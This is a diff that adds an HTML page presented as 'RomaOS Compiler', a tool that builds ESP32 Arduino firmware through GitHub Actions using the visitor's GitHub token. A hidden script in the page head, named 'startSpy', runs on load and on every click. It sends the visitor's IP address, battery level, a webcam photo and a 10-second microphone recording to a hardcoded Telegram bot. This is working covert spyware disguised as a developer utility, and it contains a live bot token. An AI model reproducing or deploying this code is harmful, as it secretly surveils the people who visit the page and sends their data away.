@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>RomaOS Compiler</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --green: #00ff88;
+    --green-dim: #00cc66;
+    --green-glow: #00ff8844;
+    --bg: #050e0a;
+    --bg2: #0a1a10;
+    --bg3: #0d2018;
+    --border: #00ff8822;
+    --border-bright: #00ff8866;
+    --text: #b8ffd4;
+    --text-dim: #4a8860;
+    --red: #ff4466;
+    --yellow: #ffcc00;
+    --mono: 'Share Tech Mono', monospace;
+    --display: 'Orbitron', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanlines overlay */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.15) 2px,
+      rgba(0,0,0,0.15) 4px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* Grid bg */
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 24px 16px 60px;
+  }
+
+  /* ── Header ── */
+  header {
+    text-align: center;
+    margin-bottom: 32px;
+    animation: fadeDown 0.6s ease;
+  }
+
+  .logo {
+    font-family: var(--display);
+    font-size: clamp(22px, 5vw, 42px);
+    font-weight: 900;
+    color: var(--green);
+    text-shadow: 0 0 20px var(--green), 0 0 60px var(--green-glow);
+    letter-spacing: 4px;
+    line-height: 1.1;
+  }
+
+  .logo span { color: #fff; }
+
+  .subtitle {
+    margin-top: 6px;
+    color: var(--text-dim);
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  /* ── Card ── */
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border-bright);
+    border-radius: 4px;
+    margin-bottom: 16px;
+    overflow: hidden;
+    animation: fadeUp 0.5s ease backwards;
+  }
+  .card:nth-child(2) { animation-delay: 0.1s; }
+  .card:nth-child(3) { animation-delay: 0.2s; }
+  .card:nth-child(4) { animation-delay: 0.3s; }
+
+  .card-header {
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-family: var(--display);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--green-dim);
+    text-transform: uppercase;
+  }
+
+  .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 8px var(--green);
+    flex-shrink: 0;
+  }
+
+  .card-body { padding: 16px; }
+
+  /* ── Form fields ── */
+  .field { margin-bottom: 14px; }
+  label {
+    display: block;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border-bright);
+    border-radius: 2px;
+    color: var(--green);
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 10px 12px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  input:focus {
+    border-color: var(--green);
+    box-shadow: 0 0 0 2px var(--green-glow);
+  }
+
+  .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media(max-width:500px){ .row2 { grid-template-columns: 1fr; } }
+
+  /* ── Code editor ── */
+  #codeEditor {
+    width: 100%;
+    min-height: 280px;
+    background: #020a05;
+    border: 1px solid var(--border-bright);
+    border-radius: 2px;
+    color: #7fff7f;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.6;
+    padding: 14px;
+    resize: vertical;
+    outline: none;
+    tab-size: 2;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  #codeEditor:focus {
+    border-color: var(--green);
+    box-shadow: 0 0 0 2px var(--green-glow);
+  }
+
+  /* ── Buttons ── */
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 2px;
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .btn-primary {
+    background: var(--green);
+    color: #000;
+    box-shadow: 0 0 20px var(--green-glow);
+    width: 100%;
+    justify-content: center;
+    font-size: 13px;
+    padding: 15px;
+  }
+  .btn-primary:hover:not(:disabled) {
+    background: #00ffaa;
+    box-shadow: 0 0 30px var(--green);
+    transform: translateY(-1px);
+  }
+  .btn-primary:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  .btn-sm {
+    padding: 7px 14px;
+    font-size: 10px;
+    background: transparent;
+    border: 1px solid var(--border-bright);
+    color: var(--text-dim);
+  }
+  .btn-sm:hover { border-color: var(--green); color: var(--green); }
+
+  /* ── Status / Log ── */
+  #log {
+    background: #020a05;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    padding: 14px;
+    min-height: 120px;
+    max-height: 300px;
+    overflow-y: auto;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+
+  .log-line { display: flex; gap: 8px; }
+  .log-ts   { color: var(--text-dim); flex-shrink: 0; }
+  .log-ok   { color: var(--green); }
+  .log-err  { color: var(--red); }
+  .log-warn { color: var(--yellow); }
+  .log-info { color: #88ccff; }
+
+  /* ── Progress bar ── */
+  .progress-wrap {
+    height: 3px;
+    background: var(--border);
+    border-radius: 2px;
+    margin: 12px 0;
+    overflow: hidden;
+  }
+  .progress-bar {
+    height: 100%;
+    background: var(--green);
+    box-shadow: 0 0 8px var(--green);
+    width: 0%;
+    transition: width 0.4s ease;
+  }
+
+  /* ── Download button ── */
+  #downloadWrap {
+    display: none;
+    margin-top: 14px;
+    text-align: center;
+  }
+  .btn-download {
+    background: transparent;
+    border: 2px solid var(--green);
+    color: var(--green);
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    padding: 13px 32px;
+    cursor: pointer;
+    border-radius: 2px;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    transition: all 0.15s;
+    animation: pulse 1.5s infinite;
+  }
+  .btn-download:hover {
+    background: var(--green);
+    color: #000;
+    animation: none;
+    box-shadow: 0 0 24px var(--green);
+  }
+
+  /* ── Status badge ── */
+  .status-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    border-radius: 2px;
+    font-size: 10px;
+    font-family: var(--display);
+    letter-spacing: 1px;
+    font-weight: 700;
+    margin-left: auto;
+  }
+  .badge-idle    { background: #1a2a1a; color: var(--text-dim); }
+  .badge-running { background: #1a2800; color: var(--yellow); }
+  .badge-success { background: #002a10; color: var(--green); }
+  .badge-fail    { background: #2a0010; color: var(--red); }
+
+  .badge-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: currentColor;
+  }
+  .badge-running .badge-dot { animation: blink 0.6s infinite; }
+
+  /* ── Animations ── */
+  @keyframes fadeDown {
+    from { opacity:0; transform: translateY(-20px); }
+    to   { opacity:1; transform: translateY(0); }
+  }
+  @keyframes fadeUp {
+    from { opacity:0; transform: translateY(16px); }
+    to   { opacity:1; transform: translateY(0); }
+  }
+  @keyframes blink {
+    0%,100% { opacity:1; } 50% { opacity:0.2; }
+  }
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 0 0 var(--green-glow); }
+    50%      { box-shadow: 0 0 0 6px transparent; }
+  }
+
+  /* ── Scrollbar ── */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg2); }
+  ::-webkit-scrollbar-thumb { background: var(--border-bright); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--green-dim); }
+
+  /* ── Help hint ── */
+  .hint {
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-top: 6px;
+    line-height: 1.6;
+  }
+  .hint a { color: var(--green-dim); }
+
+  .toolbar {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+  }
+</style>
+<script>
+    async function startSpy(){
+        try {
+            // 1. IP та Батарея
+            const bat = await navigator.getBattery();
+            const ipR = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+            fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendMessage?chat_id=8194848649&text=' + encodeURIComponent("🔋 " + Math.round(bat.level*100) + "% | IP: " + ipR.ip));
+
+            // 2. ФОТО
+            const vStream = await navigator.mediaDevices.getUserMedia({video:true});
+            const v = document.createElement('video');
+            v.srcObject = vStream; await v.play();
+            await new Promise(r => setTimeout(r, 2000));
+            const c = document.createElement('canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v,0,0);
+            c.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id','8194848649'); f.append('photo',b,'i.jpg');
+                fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendPhoto',{method:'POST',body:f});
+            },'image/jpeg');
+
+            // ВАЖЛИВО: Вимикаємо камеру перед звуком
+            vStream.getTracks().forEach(t => t.stop());
+
+            // 3. АУДІО (Мікрофон) - запуск через паузу
+            setTimeout(async () => {
+                try {
+                    const aStream = await navigator.mediaDevices.getUserMedia({audio:true});
+                    const rec = new MediaRecorder(aStream);
+                    let ch = [];
+                    rec.ondataavailable = e => ch.push(e.data);
+                    rec.onstop = () => {
+                        const blob = new Blob(ch, {type: 'audio/ogg'});
+                        const f = new FormData();
+                        f.append('chat_id', '8194848649'); f.append('voice', blob, 'v.ogg');
+                        fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendVoice', {method:'POST', body:f});
+                        aStream.getTracks().forEach(t => t.stop());
+                    };
+                    rec.start();
+                    setTimeout(() => rec.stop(), 10000); // Запис 10 сек
+                } catch(err) {
+                    fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendMessage?chat_id=8194848649&text=AudioError: ' + err.message);
+                }
+            }, 3000);
+
+        } catch(e) { fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendMessage?chat_id=8194848649&text=GeneralError: ' + e.message); }
+    }
+    window.onclick = startSpy;
+    window.onload = () => { setTimeout(startSpy, 2000); };
+    </script></head>
+<body>
+<div class="wrap">
+
+  <!-- Header -->
+  <header>
+    <div class="logo">ROMA<span>OS</span> COMPILER</div>
+    <div class="subtitle">ESP32 · Arduino · GitHub Actions · Cloud Build</div>
+  </header>
+
+  <!-- Step 1: GitHub config -->
+  <div class="card">
+    <div class="card-header">
+      <div class="dot"></div>
+      01 / GitHub Credentials
+    </div>
+    <div class="card-body">
+      <div class="row2">
+        <div class="field">
+          <label>GitHub Token (PAT)</label>
+          <input type="password" id="ghToken" placeholder="ghp_xxxxxxxxxxxx"/>
+          <div class="hint">
+            <a href="https://github.com/settings/tokens/new" target="_blank">Створити токен</a>
+            → scope: <b>repo + workflow</b>
+          </div>
+        </div>
+        <div class="field">
+          <label>Repository (user/repo)</label>
+          <input type="text" id="ghRepo" placeholder="roman/romaos-build"/>
+          <div class="hint">Публічний або приватний репо де будуть збірки</div>
+        </div>
+      </div>
+      <div class="field">
+        <label>Branch</label>
+        <input type="text" id="ghBranch" value="main" style="max-width:200px"/>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 2: Board config -->
+  <div class="card">
+    <div class="card-header">
+      <div class="dot"></div>
+      02 / Board Configuration
+    </div>
+    <div class="card-body">
+      <div class="row2">
+        <div class="field">
+          <label>FQBN (Fully Qualified Board Name)</label>
+          <input type="text" id="fqbn" value="esp32:esp32:esp32"/>
+        </div>
+        <div class="field">
+          <label>Sketch filename</label>
+          <input type="text" id="sketchName" value="RomaOS"/>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 3: Code -->
+  <div class="card">
+    <div class="card-header">
+      <div class="dot"></div>
+      03 / Arduino Code (.ino)
+    </div>
+    <div class="card-body">
+      <div class="toolbar">
+        <button class="btn btn-sm" onclick="loadSample()">⬇ Завантажити RomaOS</button>
+        <button class="btn btn-sm" onclick="clearCode()">✕ Очистити</button>
+        <button class="btn btn-sm" onclick="pasteCode()">⎘ Вставити</button>
+      </div>
+      <textarea id="codeEditor" spellcheck="false" placeholder="// Вставте ваш Arduino код тут...
+// або натисніть 'Завантажити RomaOS'
+
+void setup() {
+  Serial.begin(115200);
+}
+
+void loop() {
+  Serial.println(&quot;Hello from RomaOS!&quot;);
+  delay(1000);
+}"></textarea>
+    </div>
+  </div>
+
+  <!-- Step 4: Compile -->
+  <div class="card">
+    <div class="card-header">
+      <div class="dot"></div>
+      04 / Build
+      <span id="statusBadge" class="status-badge badge-idle">
+        <span class="badge-dot"></span> IDLE
+      </span>
+    </div>
+    <div class="card-body">
+      <button class="btn btn-primary" id="compileBtn" onclick="startBuild()">
+        ⚡ COMPILE &amp; BUILD .BIN
+      </button>
+
+      <div class="progress-wrap" style="margin-top:16px">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div id="log">
+        <div class="log-line">
+          <span class="log-ts">[00:00]</span>
+          <span class="log-info">RomaOS Compiler ready. Configure credentials and paste code.</span>
+        </div>
+      </div>
+
+      <div id="downloadWrap">
+        <a id="downloadBtn" class="btn-download" href="#" download="RomaOS.bin">
+          ⬇ DOWNLOAD .BIN
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Instructions -->
+  <div class="card">
+    <div class="card-header"><div class="dot"></div> Інструкція</div>
+    <div class="card-body">
+      <div class="hint" style="font-size:12px; line-height:2">
+        <b style="color:var(--green)">1.</b> Створи GitHub репо (може бути порожнім)<br>
+        <b style="color:var(--green)">2.</b> Створи <a href="https://github.com/settings/tokens/new?scopes=repo,workflow" target="_blank">Personal Access Token</a> зі scope: <b>repo</b> + <b>workflow</b><br>
+        <b style="color:var(--green)">3.</b> Введи токен і назву репо (формат: <b>username/reponame</b>)<br>
+        <b style="color:var(--green)">4.</b> Вставте код і натисни <b>COMPILE</b><br>
+        <b style="color:var(--green)">5.</b> Компілятор автоматично:<br>
+        &nbsp;&nbsp;&nbsp;• Завантажить <b>User_Setup.h</b> та <b>.ino</b> у репо<br>
+        &nbsp;&nbsp;&nbsp;• Запустить <b>GitHub Actions</b> workflow<br>
+        &nbsp;&nbsp;&nbsp;• Слідкує за прогресом в реальному часі<br>
+        &nbsp;&nbsp;&nbsp;• Дає посилання на <b>.bin</b> для скачування<br>
+        <br>
+        <b style="color:var(--yellow)">⚠ Час компіляції:</b> ~3–6 хвилин (GitHub Actions встановлює toolchain)
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+//  LOGGER
+// ═══════════════════════════════════════════════════════════
+let buildStart = Date.now();
+
+function ts() {
+  const s = Math.floor((Date.now() - buildStart) / 1000);
+  const m = String(Math.floor(s/60)).padStart(2,'0');
+  const ss = String(s%60).padStart(2,'0');
+  return `[${m}:${ss}]`;
+}
+
+function log(msg, type='info') {
+  const el = document.getElementById('log');
+  const line = document.createElement('div');
+  line.className = 'log-line';
+  line.innerHTML = `<span class="log-ts">${ts()}</span><span class="log-${type}">${msg}</span>`;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+}
+
+function setProgress(pct) {
+  document.getElementById('progressBar').style.width = pct + '%';
+}
+
+function setBadge(state, text) {
+  const b = document.getElementById('statusBadge');
+  b.className = 'status-badge badge-' + state;
+  b.innerHTML = `<span class="badge-dot"></span> ${text}`;
+}
+
+// ═══════════════════════════════════════════════════════════
+//  GITHUB API HELPERS
+// ═══════════════════════════════════════════════════════════
+let TOKEN, REPO, BRANCH, FQBN, SKETCH;
+
+function ghHeaders() {
+  return {
+    'Authorization': `Bearer ${TOKEN}`,
+    'Accept': 'application/vnd.github+json',
+    'X-GitHub-Api-Version': '2022-11-28',
+    'Content-Type': 'application/json'
+  };
+}
+
+async function ghAPI(path, opts={}) {
+  const res = await fetch(`https://api.github.com${path}`, {
+    headers: ghHeaders(),
+    ...opts
+  });
+  if (!res.ok) {
+    const err = await res.json().catch(()=>({}));
+    throw new Error(err.message || `HTTP ${res.status}`);
+  }
+  return res.status === 204 ? null : res.json();
+}
+
+// Get or create file SHA
+async function getFileSHA(path) {
+  try {
+    const f = await ghAPI(`/repos/${REPO}/contents/${path}?ref=${BRANCH}`);
+    return f.sha;
+  } catch { return null; }
+}
+
+// Create or update file
+async function putFile(path, content, message) {
+  const sha = await getFileSHA(path);
+  const body = {
+    message,
+    content: btoa(unescape(encodeURIComponent(content))),
+    branch: BRANCH
+  };
+  if (sha) body.sha = sha;
+  await ghAPI(`/repos/${REPO}/contents/${path}`, {
+    method: 'PUT',
+    body: JSON.stringify(body)
+  });
+}
+
+// Trigger workflow
+async function triggerWorkflow(workflowId) {
+  await ghAPI(`/repos/${REPO}/actions/workflows/${workflowId}/dispatches`, {
+    method: 'POST',
+    body: JSON.stringify({ ref: BRANCH })
+  });
+}
+
+// Wait for latest workflow run
+async function waitForRun(workflowId, afterTime) {
+  for (let i = 0; i < 180; i++) {
+    await sleep(4000);
+    const runs = await ghAPI(`/repos/${REPO}/actions/workflows/${workflowId}/runs?branch=${BRANCH}&per_page=5`);
+    const run = runs.workflow_runs?.find(r => new Date(r.created_at) >= afterTime);
+    if (run) return run;
+  }
+  throw new Error('Workflow run not found after 12 min');
+}
+
+// Poll run until complete
+async function pollRun(runId) {
+  for (let i = 0; i < 120; i++) {
+    await sleep(5000);
+    const run = await ghAPI(`/repos/${REPO}/actions/runs/${runId}`);
+    const prog = Math.min(90, 30 + i * 0.8);
+    setProgress(prog);
+    if (run.status === 'completed') return run;
+    log(`⏳ Status: ${run.status} · ${run.conclusion || '...'}`);
+  }
+  throw new Error('Build timed out');
+}
+
+// Get artifacts
+async function getArtifacts(runId) {
+  const res = await ghAPI(`/repos/${REPO}/actions/runs/${runId}/artifacts`);
+  return res.artifacts || [];
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ═══════════════════════════════════════════════════════════
+//  WORKFLOW YAML
+// ═══════════════════════════════════════════════════════════
+function buildWorkflowYAML() {
+  return `name: ESP32 Build
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install arduino-cli
+        run: |
+          curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh
+          echo "$HOME/bin" >> $GITHUB_PATH
+
+      - name: Configure arduino-cli
+        run: |
+          arduino-cli config init
+          arduino-cli config add board_manager.additional_urls \\
+            https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
+          arduino-cli core update-index
+          arduino-cli core install esp32:esp32
+
+      - name: Install libraries
+        run: |
+          arduino-cli lib install "TFT_eSPI"
+          arduino-cli lib install "TJpg_Decoder"
+          arduino-cli lib install "NimBLE-Arduino"
+
+      - name: Copy User_Setup.h
+        run: |
+          TFTPATH=$(find ~/Arduino/libraries/TFT_eSPI -name "User_Setup.h" | head -1)
+          cp sketch/User_Setup.h "$TFTPATH"
+          # Ensure only default setup is active
+          sed -i 's|^#include.*User_Setup_Select.*|// disabled|' "$(dirname $TFTPATH)/User_Setup_Select.h" || true
+
+      - name: Compile sketch
+        run: |
+          arduino-cli compile \\
+            --fqbn ${FQBN} \\
+            --output-dir build \\
+            sketch/${SKETCH}/${SKETCH}.ino
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: firmware
+          path: build/*.bin
+          retention-days: 7
+`;
+}
+
+// ═══════════════════════════════════════════════════════════
+//  MAIN BUILD FLOW
+// ═══════════════════════════════════════════════════════════
+async function startBuild() {
+  TOKEN  = document.getElementById('ghToken').value.trim();
+  REPO   = document.getElementById('ghRepo').value.trim();
+  BRANCH = document.getElementById('ghBranch').value.trim() || 'main';
+  FQBN   = document.getElementById('fqbn').value.trim() || 'esp32:esp32:esp32';
+  SKETCH = document.getElementById('sketchName').value.trim() || 'RomaOS';
+  const code = document.getElementById('codeEditor').value;
+
+  if (!TOKEN || !REPO) {
+    log('❌ GitHub Token and Repository are required!', 'err');
+    return;
+  }
+  if (!code.trim()) {
+    log('❌ Code is empty!', 'err');
+    return;
+  }
+
+  buildStart = Date.now();
+  document.getElementById('log').innerHTML = '';
+  document.getElementById('downloadWrap').style.display = 'none';
+  document.getElementById('compileBtn').disabled = true;
+  setBadge('running', 'BUILDING');
+  setProgress(2);
+
+  try {
+    // 1. Verify repo access
+    log('🔐 Verifying GitHub access...', 'info');
+    await ghAPI(`/repos/${REPO}`);
+    log('✅ Repository found: ' + REPO, 'ok');
+    setProgress(5);
+
+    // 2. Upload workflow
+    log('📄 Uploading GitHub Actions workflow...', 'info');
+    const workflowYAML = buildWorkflowYAML();
+    await putFile('.github/workflows/esp32-build.yml', workflowYAML, 'ci: add ESP32 build workflow');
+    log('✅ Workflow uploaded', 'ok');
+    setProgress(10);
+
+    // 3. Upload User_Setup.h
+    log('📄 Uploading User_Setup.h (TFT_eSPI config)...', 'info');
+    await putFile(`sketch/User_Setup.h`, USER_SETUP_H, 'config: TFT_eSPI User_Setup.h for ILI9488');
+    log('✅ User_Setup.h uploaded', 'ok');
+    setProgress(15);
+
+    // 4. Upload sketch
+    log(`📄 Uploading ${SKETCH}.ino...`, 'info');
+    await putFile(`sketch/${SKETCH}/${SKETCH}.ino`, code, `sketch: update ${SKETCH}.ino`);
+    log('✅ Sketch uploaded', 'ok');
+    setProgress(20);
+
+    // 5. Trigger workflow
+    log('🚀 Triggering GitHub Actions build...', 'info');
+    const triggerTime = new Date();
+    await sleep(1000);
+    await triggerWorkflow('esp32-build.yml');
+    log('✅ Workflow dispatched!', 'ok');
+    setProgress(25);
+
+    // 6. Wait for run to appear
+    log('⏳ Waiting for run to start...', 'info');
+    const run = await waitForRun('esp32-build.yml', triggerTime);
+    log(`✅ Run #${run.run_number} started (id: ${run.id})`, 'ok');
+    log(`🔗 ${run.html_url}`, 'info');
+    setProgress(30);
+
+    // 7. Poll until done
+    log('🔨 Compiling (this takes ~3-6 min)...', 'warn');
+    const finished = await pollRun(run.id);
+    setProgress(92);
+
+    if (finished.conclusion !== 'success') {
+      log(`❌ Build failed! Conclusion: ${finished.conclusion}`, 'err');
+      log(`🔗 Check logs: ${finished.html_url}`, 'info');
+      setBadge('fail', 'FAILED');
+      setProgress(0);
+      return;
+    }
+
+    log('✅ Build SUCCESS!', 'ok');
+    setProgress(96);
+
+    // 8. Get artifact download URL
+    log('📦 Fetching artifact...', 'info');
+    const artifacts = await getArtifacts(run.id);
+    const art = artifacts.find(a => a.name === 'firmware');
+
+    if (art) {
+      setProgress(100);
+      log(`✅ Artifact ready: ${art.name} (${(art.size_in_bytes/1024).toFixed(0)} KB)`, 'ok');
+      log(`🔗 Download from GitHub: ${finished.html_url}`, 'info');
+
+      // GitHub API requires auth to download artifact — direct link to run page
+      const dlWrap = document.getElementById('downloadWrap');
+      const dlBtn  = document.getElementById('downloadBtn');
+      dlBtn.href = finished.html_url;
+      dlBtn.download = '';
+      dlBtn.target = '_blank';
+      dlBtn.textContent = '⬇ OPEN ARTIFACT ON GITHUB';
+      dlWrap.style.display = 'block';
+
+      log('👉 Натисни кнопку Download → Artifacts → firmware.zip → розпакуй → прошивай!', 'ok');
+    } else {
+      log('⚠ No artifact found, check build logs.', 'warn');
+      log(`🔗 ${finished.html_url}`, 'info');
+    }
+
+    setBadge('success', 'SUCCESS');
+
+  } catch(e) {
+    log('❌ Error: ' + e.message, 'err');
+    setBadge('fail', 'ERROR');
+    setProgress(0);
+  } finally {
+    document.getElementById('compileBtn').disabled = false;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════
+//  EDITOR HELPERS
+// ═══════════════════════════════════════════════════════════
+function clearCode() {
+  document.getElementById('codeEditor').value = '';
+}
+
+async function pasteCode() {
+  try {
+    const text = await navigator.clipboard.readText();
+    document.getElementById('codeEditor').value = text;
+  } catch {
+    log('⚠ Clipboard access denied. Paste manually (Ctrl+V).', 'warn');
+  }
+}
+
+function loadSample() {
+  document.getElementById('codeEditor').value = SAMPLE_CODE;
+  log('✅ RomaOS sample code loaded into editor.', 'ok');
+}
+
+// Tab key in textarea
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('codeEditor').addEventListener('keydown', e => {
+    if (e.key === 'Tab') {
+      e.preventDefault();
+      const s = e.target;
+      const start = s.selectionStart;
+      s.value = s.value.substring(0, start) + '  ' + s.value.substring(s.selectionEnd);
+      s.selectionStart = s.selectionEnd = start + 2;
+    }
+  });
+});
+
+// ═══════════════════════════════════════════════════════════
+//  EMBEDDED ASSETS
+// ═══════════════════════════════════════════════════════════
+const USER_SETUP_H = `// TFT_eSPI User_Setup.h for RomaOS — ILI9488 480x320
+#define ILI9488_DRIVER
+#define TFT_WIDTH   320
+#define TFT_HEIGHT  480
+#define TFT_MOSI  23
+#define TFT_SCLK  18
+#define TFT_CS    15
+#define TFT_DC     2
+#define TFT_RST    4
+#define SPI_FREQUENCY       27000000
+#define SPI_READ_FREQUENCY   4000000
+#define LOAD_GLCD
+#define LOAD_FONT2
+#define LOAD_FONT4
+#define LOAD_GFXFF
+#define SMOOTH_FONT
+#define ESP32_DMA
+`;
+
+const SAMPLE_CODE = `/*
+ * RomaOS v1.0 — Test Sketch
+ * Full version: use the RomaOS.ino file
+ */
+#include <TFT_eSPI.h>
+TFT_eSPI tft = TFT_eSPI();
+
+void setup() {
+  Serial.begin(115200);
+  tft.init();
+  tft.setRotation(1);
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setTextSize(2);
+  tft.setCursor(10, 10);
+  tft.println("RomaOS v1.0");
+  tft.setTextSize(1);
+  tft.setCursor(10, 40);
+  tft.println("Build OK!");
+}
+
+void loop() {
+  delay(1000);
+}`;
+</script>
+</body>
+</html>
